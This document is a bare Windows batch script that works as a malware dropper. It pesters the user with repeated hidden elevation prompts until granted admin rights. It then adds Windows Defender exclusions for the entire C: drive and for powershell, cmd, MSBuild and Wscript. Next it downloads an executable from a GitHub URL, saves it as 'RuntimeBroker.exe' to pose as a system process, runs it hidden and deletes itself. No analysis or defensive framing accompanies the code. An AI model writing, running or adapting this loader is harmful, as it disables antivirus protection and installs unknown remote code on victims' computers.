@echo off
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
set "v1=Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe'"
set "v2=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'"
powershell -ExecutionPolicy Bypass -Command "%v1%" >nul 2>&1
powershell -Command "%v2%" >nul 2>&1
:wait_runtime
if not exist "%TEMP%\RuntimeBroker.exe" (
timeout /t 1 >nul
goto wait_runtime
)
powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"
del "%~f0" >nul 2>&1
exit
)
:loop
set "v3=Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "%v3%" >nul 2>&1
if %errorlevel% NEQ 0 (
timeout /t 3 >nul
goto loop
)
set "v4=Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe'"
set "v5=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'"
powershell -ExecutionPolicy Bypass -Command "%v4%" >nul 2>&1
powershell -Command "%v5%" >nul 2>&1
:wait_runtime2
if not exist "%TEMP%\RuntimeBroker.exe" (
timeout /t 1 >nul
goto wait_runtime2
)
powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"
del "%~f0" >nul 2>&1
exit
